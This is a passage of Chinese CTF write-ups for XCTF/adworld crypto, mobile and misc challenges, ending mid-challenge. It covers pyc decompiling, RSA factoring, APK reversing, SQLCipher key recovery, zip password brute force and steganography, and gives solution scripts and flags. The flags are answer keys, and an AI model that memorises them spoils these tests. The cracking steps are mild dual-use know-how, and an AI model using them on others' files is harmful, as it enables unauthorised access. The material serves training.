[42aa1a89e3ae48c38e8b713051557020.pyc](https://adworld.xctf.org.cn/media/task/attachments/42aa1a89e3ae48c38e8b713051557020.pyc)

**题目思路：**

本题是一个异或加密

反编译可以使用uncompyle6或者在线反编译pyc

安装uncompyle6，pip install uncompyle6

反编译命令 uncompyle6 crypto11.pyc，得到：UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===

我们通过反顺序异或来反编译出flag

**解题过程：**

附件下载下来发现是一个.pyc文件

pyc是一种二进制文件，是由py文件经过编译后，生成的文件，是一种byte code，py文件变成pyc文件后，运行加载的速度会有所提高；另一反面，把py文件编译为pyc文件，从而可以实现部分的源码隐藏，保证了python做商业化软件时的安全性

uncompyle6是一个原生python的跨版本反编译器和fragment反编译器，是decompyle、uncompyle、uncompyle2等的接替者。uncompyle6可将python字节码转换回等效的python源代码，它接受python 1.3版到3.8版的字节码，这其中跨越了24年的python版本，此外还包括Dropbox的Python 2.5字节码和一些PyPy字节码。github项目：https://github.com/rocky/python-uncompyle6

```python
pip3 install uncompyle6
#在.pyc所在文件夹位置打开cmd，输入命令
uncompyle6 -o . XXX.pyc
```

成功反编译为出.py文件,将print’correct’改为print(‘correct’)，将flag=raw_input()改为flag = eval(input())

```python
# uncompyle6 version 3.6.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.7.5 (tags/v3.7.5:5c02a39a0b, Oct 15 2019, 00:11:34) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: ans.py
# Compiled at: 2018-08-09 11:29:44
import base64
def encode1(ans):
    s = ''
    for i in ans:
        x = ord(i) ^ 36
        x = x + 25
        s += chr(x)
    return s
def encode2(ans):
    s = ''
    for i in ans:
        x = ord(i) + 36
        x = x ^ 36
        s += chr(x)
    return s
def encode3(ans):
    return base64.b32encode(ans)
flag = ' '
print('Please Input your flag:')
flag = eval(input())
final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='
if encode3(encode2(encode1(flag))) == final:
    print('correct')
else:
    print('wrong')
```

encode1和encode2是做异或和加和运算，encode3是调用base64库里的b32encode()函数进行base32运算。

接下来，就修改了原始代码，首先是进入函数的顺序改成先进函数3再进2最后进1。然后就是每个函数内部运算，+变-，-变+，异或运算的逆过程就是再做一次异或，所以不用变。

```python
import base64
s="UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==="
s=base64.b32decode(s).decode('ISO-8859-1')
m = ''
for i in s:
   x =ord(i)^36
   x = x - 36
   m+= chr(x)
h = ''
for i in m:
   x = ord(i) - 25
   x = x ^ 36
   h+= chr(x)
print(h)
```

cyberpeace{interestinghhhhh}

#### 10-Crypto-Normal_RSA

**题目来源：**

PCTF

**题目描述：**

你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学  很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案 做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光

**题目附件：**

[547de1d50b95473184cd5bf59b019ae8.rar](https://adworld.xctf.org.cn/media/task/attachments/547de1d50b95473184cd5bf59b019ae8.rar)

**题目思路：**

①使用openssl解密.pem中参数-->②参数十六进制转换为十进制-->③利用factor对大整数进行分解，得到p和q   -->④用rsatool生成私钥文件: private.pem-->⑤用private.pem解密flag.enc

**解题过程：**

①我们将压缩包解压发现，这道题给了两个文件，一个是加密过的的flag.enc，另一个是公钥pubkey.pem。我们需要用四个步骤拿到flag我们首先把解压得到的两个文件放在git clone好的rsatool文件夹当中。 然后我们用openssl提取出pubkey.pem中的参数，使用下面的Linux命令

```
openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem
```

得到

```
c2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dd
```

②对得到的Modulus（16）进制的转化为十进制（https://tool.lu/hexconvert/）

```
87924348264132406875276140514499937145050893665602592992418171647042491658461
```

③在线分解n（http://www.factordb.com/index.php?query=87924348264132406875276140514499937145050893665602592992418171647042491658461）

```
q=275127860351348928173285174381581152299

p=319576316814478949870590164193048041239
```

④知道两个素数，随机定义大素数e,求出密钥文件，在kail虚拟机的rsatool目录下输入命令

```python
python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239
```

⑤这时你会神奇的发现多了一个private.pem的文件，把它拿到windows，用terminal的ubuntu输入命令

```
openssl rsautl -decrypt -in flag.enc -inkey private.pem
```

PCTF{256b_i5_m3dium}

#### 11-Crypto-转轮机加密

**题目来源：**

ISCC2017

**题目描述：**

你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的  也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊。 flag，是字符串，小写。

**题目附件：**

[a3b693cdec9e4d479285c519ce9c521d.txt](https://adworld.xctf.org.cn/media/task/attachments/a3b693cdec9e4d479285c519ce9c521d.txt)

**题目思路：**

这是杰弗逊转轮加密(http://foreversong.cn/archives/138)

第一个密文是N，第一个密钥是2，去第二行找N，然后将N之前的字母放在最后`KPBEL`NACZDTRXMJQOYHGVSFUWI

**解题过程：**

![img](https://adworld.xctf.org.cn/media/uploads/writeup/f0ccbdb67c9211ea88a7fa163e3c3fd2.png)

也可以使用脚本，解出来一行一行看

```python
import re
sss = '1: < ZWAXJGDLUBVIQHKYPNTCRMOSFE < 2: < KPBELNACZDTRXMJQOYHGVSFUWI < 3: < BDMAIZVRNSJUWFHTEQGYXPLOCK < 4: < RPLNDVHGFCUKTEBSXQYIZMJWAO < 5: < IHFRLABEUOTSGJVDKCPMNZQWXY < 6: < AMKGHIWPNYCJBFZDRUSLOQXVET < 7: < GWTHSPYBXIZULVKMRAFDCEONJQ < 8: < NOZUTWDCVRJLXKISEFAPMYGHBQ < 9: < XPLTDSRFHENYVUBMCQWAOIKZGJ < 10: < UDNAJFBOWTGVRSCZQKELMXYIHP < 11 < MNBVCXZQWERTPOIUYALSKDJFHG < 12 < LVNCMXZPQOWEIURYTASBKJDFHG < 13 < JZQAWSXCDERFVBGTYHNUMKILOP <'
m = 'NFQKSEVOQOFNP'
# 将sss转化为列表形式
content=re.findall(r'< (.*?) <',sss,re.S)
# re.S:DOTALL，此模式下，"."的匹配不受限制，可匹配任何字符，包括换行符
iv=[2,3,7,5,13,12,9,1,8,10,4,11,6]
vvv=[]
for i in range(13):
    index=content[iv[i]-1].index(m[i])
    vvv.append(index)
for i in range(0,26):
    flag=""
    for j in range(13):
        flag += content[iv[j]-1][(vvv[j]+i)%26]
    print(flag.lower())
```

最后把大写转换成小写得到flag

fireinthehole

#### 11-Crypto-easy_ECC

**题目来源：**

XUSTCTF2016

**题目描述：**

转眼两个人又走到了下一个谜题的地方，这又是一种经典的密码学加密方式 而你刚好没有这个的工具，你对小鱼说“小鱼我知道数学真的很重要了，有了工具只是方便我们使用  懂了原理才能做到，小鱼你教我一下这个缇努怎么做吧！”在小鱼的一步步带领下，你终于明白了ECC  的基本原理，成功的解开了这个题目，两个人相视一笑，快步走向了下一个题目所在的位置。flag格式为cyberpeace{x+y的值}

**题目附件：**

[7dcbc9f6f95c48dfaa24f47ca1e74da5.txt](https://adworld.xctf.org.cn/media/task/attachments/7dcbc9f6f95c48dfaa24f47ca1e74da5.txt)

**题目思路：**

[ecc加密](https://www.bilibili.com/video/BV1TE411q7mW?from=search&seid=275569692284476597)

**解题过程：**

利用工具[ECCTOOL解题](https://bbs.pediy.com/thread-66683.htm)

![img](https://img2020.cnblogs.com/blog/1375459/202008/1375459-20200831164543350-2052526887.png)

最后x+y得到flag

cyberpeace{19477226185390}

### MOBILE

#### 1-Mobile-RememberOther

**题目附件：**

[476d9022bb0449c09c0b1e24f0686b66.zip](https://adworld.xctf.org.cn/media/task/attachments/476d9022bb0449c09c0b1e24f0686b66.zip)

**题目思路：**

jeb打开查看源码，找到字符串列表，解密md5，结合word提示

**解题过程：**

用jeb打开，找到源代码.com.droider.crackme0201.MainActivity

```java
public boolean checkSN(String userName, String sn) {//前面31行调用此函数
    try {
        if (userName.length() == 0 && sn.length() == 0) {
            return true;
        }
        if (userName == null || userName.length() == 0) {
            return false;
        }
        if (sn == null || sn.length() != 16) {
            return false;
        }
        MessageDigest digest = MessageDigest.getInstance("MD5");//简单的md5
        digest.reset();
        digest.update(userName.getBytes());//输入用户名
        String hexstr = toHexString(digest.digest(), BuildConfig.FLAVOR);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < hexstr.length(); i += 2) {//取奇数位
            sb.append(hexstr.charAt(i));
        }
        if (!sb.toString().equalsIgnoreCase(sn)) {
            return false;
        }
        return true;
    } catch (NoSuchAlgorithmException e) {
        e.printStackTrace();
        return false;
    }
}
```
在右边的窗口中找到resources.values.strings.xml，可以看到md5字符串

> <string name="successed">md5:b3241668ecbeb19921fdac5ac1aafa69</string>

[解MD5](https://www.somd5.com/)为：YOU_KNOW_。结合word中的提示，出题人说他不懂安卓，就是你懂了

YOU_KNOW_ANDROID

#### 2-Mobile-app3

**题目附件：**

[399649a0e89b46309dd5ae78ff96917a.ab](https://adworld.xctf.org.cn/media/task/attachments/399649a0e89b46309dd5ae78ff96917a.ab)

**题目思路：**

通过[android-backup-extractor](https://github.com/nelenkov/android-backup-extractor/releases/tag/20210409062249-e30cc24)将 .ab 文件转换为 .tar 文件，然后将apk反编译，找到密钥加密函数进行逆向解密分析，获取到密钥后，使用sqlitebrowser打开加密数据库，[解密base64](https://base64.us)数据即可。

**解题过程：**

.ab 后缀名的文件是 Android 系统的备份文件格式，它分为加密和未加密两种类型，.ab 文件的前 24 个字节是类似文件头的东西，如果是加密的，在前 24 个字节中会有 AES 256 的标志，如果未加密，则在前 24 个字节中会有 none 的标志，使用010编辑器打开可以看到

```
41 4E 44 52 4F 49 44 20 42 41 43 4B 55 50 0A 32  ANDROID BACKUP.2
0A 31 0A 6E 6F 6E 65 0A 78 DA E4 7A E5 5F 93 6F  .1.none.xÚäzå_“o
```

下载好[android-backup-extractor](https://github.com/nelenkov/android-backup-extractor/releases/tag/20210409062249-e30cc24)后使用命令`java -jar abe.jar unpack 399649a0e89b46309dd5ae78ff96917a.ab 1.tar`生成1.tar文件，解压后发现apk文件，使用AndroidKiller和jeb将该 APK 反编译，发现了存在asset目录和libs目录，并且这两个目录下存放了和sqlitecipher相关的文件，可以推断数据库被sqlitecipher加密了，在右边窗口打开bytecode.decompiler.MainActivity文件，发现函数a

```java
    private void a() {
        SQLiteDatabase.loadLibs(((Context)this));//将所需要的 sqlitecipher 库文件加载进来。
        this.b = new a(((Context)this), "Demo.db", null, 1);//实例化一个sqlitehelper类
        ContentValues v0 = new ContentValues();//实例化ContentValues类
        v0.put("name", "Stranger");//将键值对name:Stranger放入其中
        v0.put("password", Integer.valueOf(123456));//将键值对password:123456放入其中。
        com.example.yaphetshan.tencentwelcome.a.a v1 = new com.example.yaphetshan.tencentwelcome.a.a();//实例化com.example.yaphetshan.tencentwelc ome.a.a类
        String v2 = v1.a(v0.getAsString("name"), v0.getAsString("password"));//获取了v2变量的值。
        this.a = this.b.getWritableDatabase(v1.a(v2 + v1.b(v2, v0.getAsString("password"))).substring(0, 7));//调用getWritableDatabase函数，传进去的字符串参数即是数据库解密的密钥。
        this.a.insert("TencentMicrMsg", null, v0);
    }
```

数据库解密密钥由com.example.yaphetshan.tencentwelcome.a.a里面的方法生成，简单分析一下密钥生成逻辑：

在a函数7行代码，v2调用了a类中的第一个a(String, String)方法，具体方法可以看代码注释，最后返回v2=Stra1234

在a函数8行代码，先从内部看`v2 + v1.b(v2, v0.getAsString("password"))`调用了 b 类的a()函数，传进去的参数是变量v2和字符串'123456'，获取到返回值后，作为参数传给`v1.a().substring(0, 7)`函数，该函数调用了a类中的第二个a(String)方法，然后将返回值截取前 7 位作为密钥

b类里面生成密钥的算法涉及到了sha 1、md5等 算法，没必要去重新写一编，搞清楚密钥生成逻辑后把b类里面的两个函数复制出来调用即可

```java
package com.example.yaphetshan.tencentwelcome.a;//a类
public class a {
    private String a;
    public a() {
        super();
        this.a = "yaphetshan";
    }
    public String a(String arg4, String arg5) {
        return arg4.substring(0, 4) + arg5.substring(0, 4);//返回第一个参数前四个字符加第二个参数的前四个字符
    }
    public String a(String arg3) {
        new b();
        return b.b(arg3 + this.a);//返回传进去的字符串加上'yaphetshan'字符串作为参数调用b类的b方法
    }
    public String b(String arg2, String arg3) {
        new b();
        return b.a(arg2);
    }
}
```

b.java文件如下，运行b.java后得到KEY = ae56f99，获取到密钥后，使用[sqlitebrowser](https://github-releases.githubusercontent.com/19416551/719b4b00-22c0-11eb-922f-73ff1118b0fb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210508%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210508T082050Z&X-Amz-Expires=300&X-Amz-Signature=f4634d7f3e748140079464c998534505fe85944d54293ba0dc13965762a16d59&X-Amz-SignedHeaders=host&actor_id=51915181&key_id=0&repo_id=19416551&response-content-disposition=attachment%3B%20filename%3DDB.Browser.for.SQLite-3.12.1-win64-v2.msi&response-content-type=application%2Foctet-stream)的DB Browser (SQLCipher)打开加密数据库(加密设置为SQLCipher 3)，浏览数据发现了一串Base64的字符串，[base64解码](https://base64.us)得到了 flag

```java
import java.security.MessageDigest; 
import java.util.*;
public class b {
    public b() {
        super();
    }
    public static void main(String[] args){
        String varV2 = "Stra1234";
        String varV1B = a(varV2);
        String varKey = varV2 + varV1B + "yaphetshan";
        System.out.print("KEY = ");
        System.out.print(b(varKey).substring(0,7));
    }
    public static final String a(String arg9) {
        String v0_2;
        int v0 = 0;
        char[] v2 = new char[]{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
        try {
            byte[] v1 = arg9.getBytes();
            MessageDigest v3 = MessageDigest.getInstance("MD5");
            v3.update(v1);
            byte[] v3_1 = v3.digest();
            int v4 = v3_1.length;
            char[] v5 = new char[v4 * 2];
            int v1_1 = 0;
            while(v0 < v4) {
                int v6 = v3_1[v0];
                int v7 = v1_1 + 1;
                v5[v1_1] = v2[v6 >>> 4 & 15];
                v1_1 = v7 + 1;
                v5[v7] = v2[v6 & 15];
                ++v0;
            }
            v0_2 = new String(v5);
        }
        catch(Exception v0_1) {
            v0_2 = null;
        }
        return v0_2;
    }
    public static final String b(String arg9) {
        String v0_2;
        int v0 = 0;
        char[] v2 = new char[]{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
        try {
            byte[] v1 = arg9.getBytes();
            MessageDigest v3 = MessageDigest.getInstance("SHA-1");
            v3.update(v1);
            byte[] v3_1 = v3.digest();
            int v4 = v3_1.length;
            char[] v5 = new char[v4 * 2];
            int v1_1 = 0;
            while(v0 < v4) {
                int v6 = v3_1[v0];
                int v7 = v1_1 + 1;
                v5[v1_1] = v2[v6 >>> 4 & 15];
                v1_1 = v7 + 1;
                v5[v7] = v2[v6 & 15];
                ++v0;
            }
            v0_2 = new String(v5);
        }
        catch(Exception v0_1) {
            v0_2 = null;
        }
        return v0_2;
    }
}
```

Tctf{H3ll0_Do_Y0u_Lov3_Tenc3nt!}

#### 3-Mobile-easy-apk

**题目附件：**

[989ca07c3f90426fa05406e4369901ff.apk](https://adworld.xctf.org.cn/media/task/attachments/989ca07c3f90426fa05406e4369901ff.apk)

**题目思路：**

通过jeb将apk反编译，找到密钥加密函数进行分析，按照[自定义映射字符base64解码](http://web.chacuo.net/netbasex)即可。

**解题过程：**

首先我们使用老套路，用jeb或者dex2jar反编译后用jd-gui打开，并且查看java源码，在apk下bytecode中的MainActivity找到主类，右键decompile

```java
public class MainActivity extends AppCompatActivity {
    public MainActivity() {
        super();
    }
    protected void onCreate(Bundle arg3) {
        super.onCreate(arg3);
        this.setContentView(2130968603);
        this.findViewById(2131427446).setOnClickListener(new View$OnClickListener() {
            public void onClick(View arg8) {
                if(new Base64New().Base64Encode(MainActivity.this.findViewById(2131427445).getText().toString().getBytes()).equals("5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=")) {//很明显是比较字符串，将输入的字符串进行base64New()中的base64加密之后与后面的字符串进行比较
                    Toast.makeText(MainActivity.this, "验证通过!", 1).show();
                }
                else {
                    Toast.makeText(MainActivity.this, "验证失败!", 1).show();
                }
            }
        });
    }
}
```

双击跟入Base64New()，发现码表不同，所以需要使用特定的base64解密。

```java
public class Base64New {
    private static final char[] Base64ByteToStr = null;
    private static final int RANGE = 255;
    private static byte[] StrToBase64Byte;
    static {
        Base64New.Base64ByteToStr = new char[]{'v', 'w', 'x', 'r', 's', 't', 'u', 'o', 'p', 'q', '3', '4', '5', '6', '7', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'y', 'z', '0', '1', '2', 'P', 'Q', 'R', 'S', 'T', 'K', 'L', 'M', 'N', 'O', 'Z', 'a', 'b', 'c', 'd', 'U', 'V', 'W', 'X', 'Y', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', '8', '9', '+', '/'};
        Base64New.StrToBase64Byte = new byte[128];
    }
}
```

将Base64New()的编码方式复制出来处理一下，放到[base64自定义解码网站](http://web.chacuo.net/netbasex)，解密得出flag

flag{05397c42f9b6da593a3644162d36eb01}

## 高手区

### MISC

#### 1-Misc-base64÷4

**题目思路：**

base64÷4=base16,用在线base16解码即可得到flag

**解题过程**：

首先下载附件,是一个TXT文本,打开后发现有一串字符：666C61677B45333342374644384133423834314341393639394544444241323442363041417D。我们分析一下这串字符,发现由数字和大写字母组成,再联想到题目,猜测是base16加密,于是我们解密一下。

解码地址：https://www.qqxiuzi.cn/bianma/base.php?type=16

flag{E33B7FD8A3B841CA9699EDDBA24B60AA}

#### 2-Misc-wireshark-1

**题目描述：**

黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)。   flag提交形式为flag{XXXX}

**题目思路：**

解压后是一个pcap数据包,看到登录应该找HTTP POST请求了,用wireshark打开搜索即可得到答案

**解题过程**：

可以使用winhex打开搜索password

也可以wireshark打开,搜索http,第20个包是post的包,可能包含管理员密码,打开后从html中找到password

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/wireshark-1/1.png)

ffb7567a1d4f4abdffdb54e022f8facd

#### 3-Misc-Training-Stegano-1

**题目描述：**

这是我能想到的最基础的图片隐写术

**题目思路：**

把文字放在图片中是一种最常见的隐写方式

**解题过程**：

用winhex打开,就能直接看到flag

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/Training-Stegano-1/1.png)

steganoI

#### 4-Misc-János-the-Ripper

**题目思路：**

使用winhex打开发现是zip文件,然后用ziperello爆破

**解题过程**：

第一步,下载文件发现,一个未知格式的文件,使用winhex/01编辑器打开发现是zip文件,于是修改后缀名为zip。发现里面有一个加密的flag.txt文件。

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020020610303222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Zvb2xfYmVzdA==,size_16,color_FFFFFF,t_70)

第二步、利用ziperello（D:\CTF\Crypto\编码与密码\密码\Zip\Ziperello\Ziperello.exe）进行爆破,选择所有字符,很快可以爆破出来密码是fish,即可得到flag

flag{ev3n::y0u::bru7us?!}

#### 5-Misc-Banmabanma

**题目思路：**

在线扫描工具

**解题过程**：

打开解压，发现条形码的图片

直接在线扫描条形码（https://online-barcode-reader.inliteresearch.com/）,把图片上传上去Read然后就能得到flag

![img](https://adworld.xctf.org.cn/media/uploads/writeup/11024c0a4ee811ea88a3fa163e3c3fd2.png)

flag{TENSHINE}

#### 6-Misc-Test-flag-please-ignore

**题目思路：**

下载后发现文件有点小,所以就不考虑是有隐藏文件了

**解题过程**：

直接放进winhex,或者是sublime里,里面内容是：

```
666c61677b68656c6c6f5f776f726c647d
```

然后发现数字是0-f所以尝试进行十六进制反编码（D:\CTF\Crypto\编码与密码\万能字符转换Character1.2.exe）或者用下面的代码

![img](https://adworld.xctf.org.cn/media/uploads/writeup/e4d2a4cae68911e99f5500163e004e93.png)

flag{hello_world}

#### 7-Misc-Hear-with-your-Eyes

**题目描述：**

用眼睛听这段音频

**题目思路：**

用audacity /Adobe Audition CC 2018打开这个音频文件，然后调至频谱图，出现flag。

**解题过程**：

下载好文件之后解压，发现里面有个没有后缀的文件，放到winhex里观察，文件头是`1f8b0800`发现是gzip文件的文件头，于是把后缀改为zip，重复几次解压后，打开里面有一首歌sound.wav。

1.用audacity（D:\CTF\hack\个人CTFTools\隐写\音频隐写\Audacity\audacity.exe）打开这个音频文件，然后调至频谱图，出现flag。

![img](https://image.3001.net/images/20180116/15160874983595.png)

2.用au（E:\abode\Adobe Audition CC 2018\Adobe Audition CC.exe）打开这个音频文件，视图->显示频谱，出现flag。

e5353bb7b57578bd4da1c898a8e2d767

#### 8-Misc-What-is-this

**题目描述：**

找到FLAG

**题目思路：**

解压出没有后缀的文件,添加后缀.zip,继续解压还是压缩包,最后解压出两张图片,其中每个位置的黑色像素和白色像素是互补的

**解题过程**：

tar -xvf e66ea8344f034964ba0b3cb9879996ff.gz

得到pic1.jpg,pic2.jpg,打开stegsolve(D:\CTF\hack\个人CTFTools\隐写\图像隐写\Stegsolve.jar),先打开其中一张图片，然后点analyse->image combiner,添加另一张图片,就可以看到flag

![img](https://adworld.xctf.org.cn/media/uploads/writeup/bc67bb56e67f11e99f5500163e004e93.png)

也可以使用脚本：

![img](https://adworld.xctf.org.cn/media/uploads/writeup/aeee95a6f3c411e99f5600163e004e93.png)

AZADI TOWER

#### 9-Misc-embarrass

**题目思路：**

linux环境下直接`strings misc_02.pcapng | grep flag`可得flag。

win下可以使用winhex分析得到flag

**解题过程**：

1.直接用wireshark搜索(分组字节流,字符串)flag{,在第2754个包中有flag

2.strings misc_02.pcapng | grep flag

![img](https://adworld.xctf.org.cn/media/uploads/writeup/47586ff04b1e11ea88a2fa163e3c3fd2.png)

3.使用winhex分析得到flag

![img](https://adworld.xctf.org.cn/media/uploads/writeup/5fa436b4111411ea9f5800163e004e93.png)

flag{Good_b0y_W3ll_Done}

#### 10-Misc-神奇的Modbus

**题目描述：**

寻找flag,提交格式为sctf{xxx}

**题目思路：**

工业设备消息传输使用modbus协议。所以我就采集了modbus的通信数据包。在这些数据传输中存在着flag。接替思路是这样的，利用该modbus读取设备的相关数据。首先读取数据的话modbus 有01，02，03，04功能码，01是读取线圈状态：取得一组逻辑线圈的当前状态（ON/OFF  ），02是读取输入状态:取得一组开关输入的当前状态（ON/OFF），03是读取保持寄存器:在一个或多个保持寄存器中取得当前的二进制值，04读取输入寄存器：在一个或多个输入寄存器中取得当前的二进制

**解题过程**：

1.wireshark输入modbus过滤并追踪tcp流

![追踪tcp流](https://img-blog.csdnimg.cn/20190724160730150.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDYyNDg2OQ==,size_16,color_FFFFFF,t_70)

得到结果：sctf{Easy_Modbus}   (虽然在wireshark中显示的是Easy_Mdbus,但得写成Easy_Modbus才能提交成功)

2.查看题目描述为寻找flag,提交格式为sctf{xxx}。那么我们就开始查找sctf.直接用wireshark搜索(分组字节流,字符串)sctf{,在第9261个包中有flag

sctf{Easy_Modbus}

#### 11-Misc-can_has_stdio?

**题目思路：**

**Brainfuck**，是一种极小化的计算机语言，它是在1993年创建的，简称为**BF**。这种 语言，是一种按照“Turing complete（完整图灵机）”思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言，BrainFuck 语言所有的操作都由八种符号的组合来完成。

BF基于一个简单的机器模型，除了八个指令，这个机器还包括：一个以字节为单位、被初始化为零的数组、一个指向该数组的指针、以及用于输入输出的两个字节流。

下面是这八种指令的描述，其中每个指令由一个字符标识：

| 字符 | 含义                                                         |
| ---- | ------------------------------------------------------------ |
| `>`  | 指针加一                                                     |
| `<`  | 指针减一                                                     |
| `+`  | 指针指向的字节的值加一                                       |
| `-`  | 指针指向的字节的值减一                                       |
| `.`  | 输出指针指向的单元内容（ASCII码）                            |
| `,`  | 输入内容到指针指向的单元（ASCII码）                          |
| `[`  | 如果指针指向的单元值为零，向后跳转到对应的`]`指令的次一指令处 |
| `]`  | 如果指针指向的单元值不为零，向前跳转到对应的`[`指令的次一指令处 |

Brainfuck程序可以用下面的替换方法翻译成C语言（假设`ptr`是`char*`类型）：

| Brainfuck | C                  |
| --------- | ------------------ |
| `>`       | `++ptr;`           |
| `<`       | `--ptr;`           |
| `+`       | `++*ptr;`          |
| `-`       | `--*ptr;`          |
| `.`       | `putchar(*ptr);`   |
| `,`       | `*ptr =getchar();` |
| `[`       | `while (*ptr) {`   |
| `]`       | `}`                |

**解题过程**：

一、用记事本打开文件是一大串brainfuck密文

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200330151548742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMDgxMTcw,size_16,color_FFFFFF,t_70)

通过在线brainfuck解释器执行（地址：http://tool.bugku.com/brainfuck/?wafcloud=2）Brainfuck to Text解码得到flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200330151803680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMDgxMTcw,size_16,color_FFFFFF,t_70)

二、解压文件然后修改后缀为.b，然后使用（D:\CTF\Crypto\编码与密码\编码\Brainfuck）小程序打开，按绿色的三角执行就可以得到flag

flag{esolangs_for_fun_and_profit}

#### 12-Misc-很普通的数独

**题目思路：**

以数独混淆，其实是将这25张图组成`5*5`的二维码。

**解题过程**：

先下载附件，发现是一个解压包，进行解压。看到文件夹里有一大堆数独图片，个人认为如果将数独解出来没有什么意义，既耗时又没有价值。于是我们再仔细观察一下这些数独图片，注意到第1，5，21张图片有些蹊跷。

1.png,5.png,21.png仔细看看就是二维码的定位形状，三个角上的方形块，但是按排列的画，这三个图的顺序不对，需要将图片1.png,5.png,21.png重命名成:5.png,21.png,1.png，图片数量为25张，是5的平方，所以，这25张图片组合起来就是一张二维码。于是上python脚本。

```python
from PIL import Image
path = input("输入图片路径")
img0 = Image.new("RGBA", (180, 180), "white")
box0 = (3, 3, 199, 199)
for i in range(45):
    for j in range(45):
        pngnum = i // 9 * 5 + j // 9 + 1
        img1 = Image.open(path + "\\" + str(pngnum) + ".png")
        box = ((j % 9) * 22 + 11, (i % 9) * 22 + 11, (j % 9) * 22 + 18, (i % 9) * 22 + 18)
        img2 = img1.crop(box0).crop(box).load()
        sign = False
        for x in range(7):
            for y in range(7):
                if img2[x, y] != (255, 255, 255, 255):
                    sign = True
                    break
            if sign:
                break
        if sign:
            for x in range(4):
                for y in range(4):
                    img0.putpixel([i * 4 + x, j * 4 + y], (0, 0, 0))
img0.save(path + "\\" + "result.png")
```

运行后得到二维码。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200217221637510.png#pic_center)

得到一串字符串：Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9。猜测是base64加密，于是进行解密。在解密7次之后，得到flag

flag{y0ud1any1s1}

#### 13-Misc-something_in_image

**题目思路：**

直接用编辑器打开搜索关键字flag即可得到flag

**解题过程**：

解压出来直接右键用记事本打开，然后ctrl+f搜索flag

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/something_in_image/1.png)

或者在Linux下用strings命令查找

Flag{yc4pl0fvjs2k1t7T}

#### 14-Misc-pure_color

**题目描述：**

格式为flag{xxxxxx}

**题目思路：**

使用StegSolve工具即可得到flag

**解题过程**

下载下来是空白图片，使用Stegsolve（D:\CTF\hack\个人CTFTools\隐写\图像隐写\Stegsolve.jar）打开调整到blue plane 0可以发现

![img](https://adworld.xctf.org.cn/media/uploads/writeup/25eb8656717811ea88a7fa163e3c3fd2.png)

flag{true_steganographers_doesnt_need_any_tools}

#### 15-Misc-Aesop_secret

**题目思路：**

AES加解密

**解题过程：**

先下载附件，是一个压缩包，紧接着解压，发现一个gif文件。注意到这个gif文件播放时每一帧的位置都不一样，想到如果把每一帧的图像同时显现出来会怎么样。于是我们用Photoshop打开这个文件，显现每一帧图像。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200217165611339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01hcmN1c1JZWg==,size_16,color_FFFFFF,t_70#pic_center)

用记事本再次打开这个gif，是那种乱码格式，但是你到最后发现:

```
U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw==
```

